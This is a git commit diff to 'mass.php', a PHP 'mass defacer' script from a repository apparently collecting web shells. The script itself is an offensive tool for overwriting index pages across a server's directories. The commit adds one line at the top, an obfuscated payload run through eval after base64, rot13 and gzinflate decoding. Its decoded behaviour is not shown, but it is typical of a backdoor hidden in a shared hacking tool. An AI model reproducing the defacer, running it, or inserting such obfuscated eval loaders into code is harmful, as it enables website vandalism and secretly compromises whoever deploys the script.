d62901a9e9948cb58f37b506496dfa3be0b3bb2f
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-09-16 08:47:39 +0630

    Add files via upload

--- SHELLs/Mass Defacer/mass.php
+++ SHELLs/Mass Defacer/mass.php
@@ -1,6 +1,7 @@
 <?php
 
-echo "<title>[ MASS DEFACER ]</title>";
+eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
+echo "<title>[ MASS DEFACER ]</title>"; 
 echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
 echo "<body bgcolor='black'><font color=red'><font face='Electrolize'>";
 echo "<center><form method='POST'>";
@@ -29,6 +30,5 @@ if (isset ($_POST['base_dir']))
                                 echo "<font color='lime'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font><br>";
                 }
         endforeach;
-}
- 
+}; 
 ?>
